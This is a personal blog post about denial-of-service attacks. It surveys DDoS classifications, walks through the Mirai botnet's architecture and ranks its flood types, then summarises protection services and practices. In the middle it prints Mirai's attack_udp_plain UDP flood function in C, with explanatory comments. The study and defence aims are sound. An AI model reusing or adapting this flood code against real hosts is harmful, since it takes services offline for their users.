---
Title: "An Initial Exploration of DoS (Denial of Service) Attacks"
Date: 2019-07-07T18:33:00+11:00
Summary: Recently, while browsing Weibo, I came across an interesting article titled "My Experience with DDoS Extortion." Like reading a story, I read it in one go. As a backend programmer, I have long heard about DoS attacks and have been interested in the techniques and principles of attack and defense in this area. This article reminded me of a series of articles I had previously read on DoS, such as "DDoS Attack Prevention Tutorial", "DD4BC - A Hacker Group Specializing in DDoS Extortion for Bitcoin", "Analysis and Reproduction of Linux Kernel SCTP Protocol Vulnerabilities (CVE-2019-8956)" and "GitHub Suffers Memcached-Based DDoS Attack with a Scale of 1.35 Tbps" This time, I plan to explore DoS (including DDoS) systematically on my own, and this article is a record of my exploration.
draft: false
---

## Background

Recently, while browsing internet, I came across a very interesting article titled [A Journey of Being Blackmailed by DDoS](https://www.freebuf.com/articles/es/205934.html). I read it in one breath, as if I were reading a story. As a backend programmer, I have long been aware of DoS attacks and I am very interested in the defense and attack techniques and principles in this area. This article reminded me of a series of articles I had read before about DoS, such as [DDoS Attack Prevention Tutorial](http://www.ruanyifeng.com/blog/2018/06/ddos.html), [DD4BC: A Hacker Group Specializing in DDoS Extortion for Bitcoin](https://www.8btc.com/article/67111), [Linux Kernel SCTP Protocol Vulnerability Analysis and Reproduction (CVE-2019-8956)](https://paper.seebug.org/938/), and [GitHub Suffers Memcached-based DDoS Attack Scaling up to 1.35Tbps](https://www.anquanke.com/post/id/99608). This time, I plan to conduct a systematic exploration of the DoS (including DDoS) area myself, and this article is a record of some of my explorations.

## What are DoS (Denial of Service) and DDoS attacks?

Based on its literal meaning, my understanding is that any attack that disrupts the normal operation of a service, causing ordinary users to be unable to access the corresponding service, can be considered a DoS attack (Denial of Service Attack). This includes two types of attacks: "winning by quantity" and "precision strike". Winning by quantity refers to consuming network and server resources through a large number of requests, as mentioned in the previous section, "Preventing DDoS Attacks." The attack on GitHub based on Memcached, which reached a scale of 1.35Tbps, can be classified as this type. Precision strike, on the other hand, exploits vulnerabilities in a specific service, often causing the target service to crash with just a computer and a few commands, such as the example mentioned earlier, "Analysis and Reproduction of the Linux Kernel SCTP Protocol Vulnerability (CVE-2019-8956)."

However, most of the definitions I have seen so far refer to the "winning by quantity" type of attack. For example, on Security [RSS]((https://www.secrss.com/articles/8872)), the definition of DoS attack is:

> A DoS attack refers to attackers using reasonable service requests to occupy too many resources, causing the target system to be unable to provide normal services. This can be achieved by blocking various types of access requests: servers, devices, services, networks, applications, and even specific transactions within programs.

[wikipedia](https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A) defines DoS attacks as follows:
> A denial-of-service attack (DoS attack) is a cyber-attack in which the perpetrator seeks to make a machine or network resource unavailable to its intended users by temporarily or indefinitely disrupting services of a host connected to the Internet.

This article mainly analyzes the "winning by quantity" type of attack. If there is a chance in the future, we will study the "precision strike" type of attack separately.

Since it is about winning by quantity, we cannot ignore DDoS (Distributed Denial of Service) attacks. Compared with DoS attacks, DDoS attacks may be more well-known, leading to these two terms being often used interchangeably. According to Wikipedia, when hackers use two or more compromised computers on the network as "zombies" to launch "denial of service"-style attacks against specific targets, it is called a distributed denial-of-service attack (DDoS attack).

## Common Types and Classification of DDoS Attacks

There are various techniques used in DDoS attacks, and it is necessary to classify them in order to better understand their characteristics. One common way of classifying them (as seen on the Chinese version of Wikipedia) is based on the type of resources consumed. There are two main types: attacks that target bandwidth consumption and attacks that target server resources (such as CPU, RAM, and disk space).


Bandwidth consumption attacks include:
* UDP Flood
* ICMP Flood
* ...

Resource consumption attacks include:
* TCP SYN Flood
* Distributed HTTP Flood
* ...

In my understanding, bandwidth consumption attacks are a "brute force" attack method that aims to consume the available bandwidth. Regardless of the type of service being provided, the attacker floods the network with traffic, causing the network bandwidth to be exhausted. Even if the service is still running, most legitimate requests from users will be unable to reach the server, resulting in a denial-of-service attack. Resource consumption attacks, on the other hand, are more "sophisticated" and focus on consuming specific server resources. For example, TCP SYN Flood, the most common DDoS attack, exploits a weakness in the TCP three-way handshake and can render a target server unresponsive with relatively low cost (more details can be found in the SYN Flood section of the article "DDoS Attack Protection Experience Learned from Losing Hundreds of Thousands of Dollars" at http://www.ijiandao.com/safe/cto/15952.html). Both types of attacks have their advantages and disadvantages. Bandwidth consumption attacks are relatively easy to implement, but require a large amount of traffic to bring a service to a "denial of service" state (usually achieved through overwhelming the network at the link layer with high volume attacks, as explained in Chapter 4 of the article "On the Persistence of War: Entering the Tencent DDoS Protection System" at https://security.tencent.com/index.php/blog/msg/71). Resource consumption attacks, on the other hand, are more targeted and require less traffic to be effective.


In addition to classifying based on the type of resource consumption, DDoS attacks can also be classified based on the different network layers they attack. For example, AWS's whitepaper "AWS Best Practices for DDoS Resiliency" uses this classification to categorize DDoS attacks.

![](https://i.imgur.com/QYDY8xa.png)

In the whitepaper, attacks on layers 3 and 4 are classified as Infrastructure Layer Attacks, while attacks on layers 6 and 7 are classified as Application Layer Attacks. This classification is similar to the previous classification based on resource consumption. Infrastructure Layer Attacks, which are relatively low-level attacks, require a large amount of traffic to be effective, while higher-level attacks such as Application Layer Attacks do not require as much traffic. My understanding is that the higher the layer, the more system resources are required per unit of traffic. For example, at layers below 3, only bandwidth is consumed, but at layer 7, CPU, RAM, and even file handles (the system has a maximum number of file handles) are consumed. If any of these resources are insufficient, it can affect the stability of the service, or even cause it to be denied.


In addition to these two common classifications, I also saw another classification in a paper titled [DDoS-Capable IoT Malwares: Comparative Analysis and Mirai Investigation](https://www.hindawi.com/journals/scn/2018/7178164/). The authors of the paper believed that classifying based on the attacked network protocol is not accurate enough, as some DDoS attacks may involve more than one layer.
> ... we will not consider that taxonomy since we believe that it is extremely inaccurate and hard to use (it is possible to have DDoS attacks which involve more than one protocol).

The paper provides a very detailed classification of DDoS attacks, listing almost every possible type of attack, as shown in the [figure in the paper](https://www.hindawi.com/journals/scn/2018/7178164/fig1/):
![](https://i.imgur.com/rtOYG2h.png)

## DDoS Attack Cycle

After discussing various methods of DDoS attacks, the question remains: how is a successful DDoS attack achieved? This brings us to the DDoS attack cycle. Firstly, for a DDoS attack to be successful, it needs to win with quantity, and the most important factor is collecting enough machines that can be used to launch the attack.

According to [DDoS attacks and defense mechanisms: classiﬁcationand state-of-the-art](https://www.academia.edu/23981350/DDoS_attacks_and_defense_mechanisms_classification_and_state-of-the-art), a DDoS attack generally goes through the following stages before the attack:

1. Scanning for machines with vulnerabilities
2. Remotely infecting these machines through the vulnerabilities, making them part of a botnet
3. Communicating with these infected machines to confirm whether they are online or arranging for upgrades, etc.
4. Controlling these machines to launch a DDoS attack.

As we can see, a significant part of the DDoS attack cycle involves collecting and infecting vulnerable machines, and the various methods of DDoS attacks mentioned earlier are just the final step to achieve this goal. In this regard, Mirai has been very successful. The following will use Mirai as an example and further analyze DDoS attacks from the source code level.

### Mirai

Mirai is one of the most dangerous malware in recent years, infecting approximately 500,000 machines. Its target is mainly IoT devices with poor security and a large number of them, such as home routers, CCTV monitors, and so on.

Mirai's architecture mainly consists of four parts:
1. CNC (Command and Control) server: Its main function is to receive user commands and send commands to the botnet (a network composed of infected machines).
2. Mirai bot: A single machine that constitutes the botnet. It includes three modules:
    i). Scanning module: responsible for scanning vulnerable machines, once found, it will report to the reporting server
    ii). Killer module: responsible for removing other malware on the machine, thus achieving exclusive control over the device
    iii). Attack module: responsible for launching DDoS attacks
3. Reporting server: responsible for collecting vulnerable machine information from Mirai bot and forwarding it to the Loader server
4. Loader server:uploading malicious code to remote devices, thus achieving the goal of controlling the machines.

![](https://i.imgur.com/FjhUyBr.png)

After understanding Mirai's main components and structure, let's take a look at its [source code](https://github.com/jgamblin/Mirai-Source-Code)。

In DDoS attacks, I believe the two most important parts are Mirai's DDoS attack code and its code for scanning and infecting vulnerable machines. This article mainly analyzes the DDoS attack code, while for other parts, those interested can refer to this paper（[DDoS-Capable IoT Malwares: Comparative Analysis and Mirai Investigation](https://www.hindawi.com/journals/scn/2018/7178164/)，which provides a detailed analysis and introduction to the source code.

Let's first take a look at the DDoS attack code, which is mainly located under the mirai/bot directory and named in the form of attack_xxx.c. Mirai mainly has four types of attack methods, with several attack methods in each category:
1. udp(attack_udp.c)
   * attack_udp_generic (Implement a slightly more complex UDP flood, but with greater flexibility)
   * attack_udp_vse   （"vse" refers to Valve Source Engine, which is primarily targeted for attacks on game servers.）
   * attack_udp_dns   （）
   * attack_udp_plain (The simplest UDP flood, with higher PPS than generic.)
2. tcp(attack_tcp.c)
   * attack_tcp_syn 
   * attack_tcp_ack  ([Everything About TCP ACK Flood](http://blog.ddos-guard.ir/everything-about-tcp-ack-flood/))
   * attack_tcp_stomp ([How Mirai Uses STOMP Protocol to Launch DDoS Attacks](https://www.imperva.com/blog/mirai-stomp-protocol-ddos/))
3. gre(attack_gre.c)
   * attack_gre_eth ([GRE Tunnel for Humans: Making Sense of GRE](https://www.imperva.com/blog/what-is-gre-tunnel/?utm_campaign=Incapsula-moved))
   * attack_gre_ip (GRE flood)
4. app(attack_app.c)
   * attack_app_proxy（not implemented）
   * attack_app_http
   * attack_app_cfnull

Due to space limitations, only the simplest attack in UDP, attack_udp_plain, will be analyzed here (the code has been simplified by removing the debug portion for ease of reading).
```
void attack_udp_plain(uint8_t targs_len, struct attack_target *targs, uint8_t opts_len, struct attack_option *opts)
{
    int i;
    char **pkts = calloc(targs_len, sizeof (char *));
    int *fds = calloc(targs_len, sizeof (int));
    port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff);
    port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff);
    uint16_t data_len = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_SIZE, 512);
    BOOL data_rand = attack_get_opt_int(opts_len, opts, ATK_OPT_PAYLOAD_RAND, TRUE);
    struct sockaddr_in bind_addr = {0};

    // If no port is specified, a source port will be randomly chosen.
    if (sport == 0xffff)
    {
        sport = rand_next();
    } else {
        sport = htons(sport);
    }

    // create packets
    for (i = 0; i < targs_len; i++)
    {
        struct iphdr *iph;
        struct udphdr *udph;
        char *data;

        // Allocate 65535 × 4 bytes of space for each packet.
        pkts[i] = calloc(65535, sizeof (char));

        // If no port is specified, randomly choose a destination port.
        if (dport == 0xffff)
            targs[i].sock_addr.sin_port = rand_next();
        else
            targs[i].sock_addr.sin_port = htons(dport);

        if ((fds[i] = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)) == -1)
        {
            return;
        }

        bind_addr.sin_family = AF_INET;
        bind_addr.sin_port = sport;
        bind_addr.sin_addr.s_addr = 0;

        bind(fds[i], (struct sockaddr *)&bind_addr, sizeof (struct sockaddr_in));

        // For prefix attacks
        if (targs[i].netmask < 32)
            targs[i].sock_addr.sin_addr.s_addr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask));

        // Different from the "connect" function in TCP, "connect" in UDP does not actually establish a connection, but rather speeds up the sending process.
        connect(fds[i], (struct sockaddr *)&targs[i].sock_addr, sizeof (struct sockaddr_in));
    }
    
    // After setting up all the packets, send the packet.
    while (TRUE)
    {
        for (i = 0; i < targs_len; i++)
        {
            char *data = pkts[i];

            // Randomize packet content?
            if (data_rand)
                // If no length is specified, the default length of the data is 512
                rand_str(data, data_len);

            send(fds[i], data, data_len, MSG_NOSIGNAL);
        }
    }
}
```


From the analysis of the above source code, it can be seen that DDoS attacks are nothing more than constructing packets and sending them. The source code for other types of attacks is also similar. The key lies in what the protocol is in the middle.


## Does DDoS attack have a distinction between advanced and low-level?

Among so many DDoS attack methods, which one is the strongest and most threatening? Is it UDP attacks that can cause extremely high traffic, or HTTP floods that precisely target and consume service resources?

Using Mirai as an example, the book [《A Field Guide to Understanding IoT Attacks from the Mirai Botnet to Its Modern Variants》](https://www.datacom.cz/userfiles/miraihandbookebook_final.pdf) provides detailed explanations of various attacks, including their bandwidth profile (mainly composed of BPS (bits per second) and PPS (packets per second)), and even ranks them based on threat index.

![](https://i.imgur.com/TRF0Cw5.png)

According to this report, DNS flood (attack_udp_dns) is the most threatening type of attack. This attack continuously sends a series of random subdomain (in the form of $STRING.domain.com) DNS queries, causing the target's name server to refuse service.
![](https://i.imgur.com/TdWzupo.png)

The reason why it is difficult to defend against is that all traffic comes from normal DNS servers, making it difficult to distinguish between normal and attack traffic.

The second-ranked attack is VSE Flood. This attack mainly targets the Valve Source Engine game service. Due to design issues in the protocol, it is difficult to distinguish between normal and attack requests, making it difficult to prevent this type of DDoS attack.

The top two attacks are both UDP layer attacks, and both are attacks targeting specific services (DNS, game servers). The third-ranked STOMP is a TCP layer attack, and it is not targeted at a specific service. As long as there is a TCP connection, it can be attacked. Its attack method is to first lie in wait (establish a connection through a 3-way handshake), and then start wreaking havoc (PSH+ACK flood). The reason why it ranks in the top three is because this attack method can bypass some DDoS protections.

In the report, HTTP flood is ranked last. As a representative of precise attacks, the bps/pps of HTTP flood are the lowest among all attacks. But this is not the reason why it ranks low. In Mirai, there is only one simple HTTP attack method. This simple attack method does not require any user settings. This is why HTTP flood ranks last. Its power is not fully utilized in Mirai.

Based on the above analysis, in my opinion, the strongest DDoS attack depends on the specific scenario and the target of the attack. For example, for an attack targeting the Valve Source Engine service, VSE flood is the most threatening. As an aside, among so many traditional DDoS attacks, VSE flood is relatively unique because it targets a specific game server. I am curious why such an attack method exists. Perhaps game servers are easier to extort and have greater profits?

## DDoS Attack Protection

As the saying goes, when you build a taller wall, the devil builds a taller ladder. The offense and defense of DDoS attacks always go hand in hand. Talking about attacks without discussing protection always feels incomplete. In this article, I mainly reference the "AWS DDoS White Paper", "On the Persistence of War - Entering the Tencent DDoS Protection System", and "DDoS Attack Protection Experience Learned from Losing Tens of Thousands of Dollars!"

In the face of attacks that can reach tens of GBps or even TBps, most companies rely on third-party DDoS protection systems such as Akamai, Cloudflare, and Cloudfront. The principle of protection is mainly to distribute a large number of requests to CDNs with some protective functions, so that a large number of requests cannot reach the source server. This requires a lot of network and machine resources, which most companies cannot afford.

As a leading global cloud service provider (Amazon invested in cloud services very early, reportedly 7 years ahead of other competitors), AWS has a complete set of DDoS protection facilities from layer 4 to layer 7 of the network layer. The white paper mentions that Cloudfront, combined with AWS WAF, can protect against all attacks from layer 4 to layer 7. In addition, Amazon Route 53 (DNS system) can effectively distribute/restrict attack traffic. Even if some traffic passes through the network where the server is located, AWS also has a set of defense mechanisms. ELB (Elastic Load Balancing), API Gateway, VPC (Virtual Private Cloud), and auto-scaling EC2 can all effectively reduce the impact of DDoS attacks.

![](https://i.imgur.com/ng7Cuyp.png)

After reading the AWS white paper, I feel that my understanding of DDoS protection is still relatively vague. Anyway, using the services of others is enough, and we don't need to understand or manage many underlying protections (this is also a feature of cloud services, where cloud service providers have already done a lot of basic work). In the "On the Persistence of War - Entering the Tencent DDoS Protection System", the author summarizes a set of defense countermeasures and suggestions for DDoS attacks. I fully agree with the 6th point - returning to the essence and serving the business. Truly powerful DDoS attacks are difficult to prevent because they target specific business attributes (it is difficult to distinguish normal traffic from attack traffic). As mentioned earlier, attacks on DNS and VES are so effective because of the vulnerabilities in their own design. Therefore, better protection must be based on the characteristics of the business (because powerful DDoS attacks can also disguise themselves as normal traffic based on business characteristics).

The author of "DDoS Attack Protection Experience Learned from Losing Tens of Thousands of Dollars!" is an experienced veteran, with 15 years of DDoS attack protection experience. The article contains many attack analyses and defense strategies, and delves into their principles. I recommend reading it, but I won't go into detail here. According to his recommendation, CF (Cloudflare) DDoS protection service is very good.
## Summary

DDoS attack protection is a vast and profound field. It's challenging to get a comprehensive understanding of it in a short article (I have come across a lot of DDoS-specific terms in a short amount of time). Whether it's an attack or defense, there are still many areas to learn and explore, and many places to dig deeper. I believe there will be more new DDoS attack and defense techniques in the future, but by then, I won't be completely in the dark. Exploring DDoS attack protection for the first time in a more systematic way is still very interesting. Next, I will continue to study and explore the critical aspects of DDoS - scanning and infecting vulnerable machines.

## Reference
1. https://www.freebuf.com/articles/es/205934.html
2. http://www.ruanyifeng.com/blog/2018/06/ddos.html
3. https://www.8btc.com/article/67111
4. https://paper.seebug.org/938/
5. https://www.anquanke.com/post/id/99608
6. https://www.secrss.com/articles/8872
7. https://zh.wikipedia.org/wiki/%E9%98%BB%E6%96%B7%E6%9C%8D%E5%8B%99%E6%94%BB%E6%93%8A
8. http://www.ijiandao.com/safe/cto/15952.html
9. https://security.tencent.com/index.php/blog/msg/71
10. https://d1.awsstatic.com/whitepapers/Security/DDoS_White_Paper.pdf
11. https://www.academia.edu/23981350/DDoS_attacks_and_defense_mechanisms_classification_and_state-of-the-art
12. https://www.cloudflare.com/press-releases/2018/cloudflare-named-a-leader-in-idc-marketscape-ddos-prevention-solutions/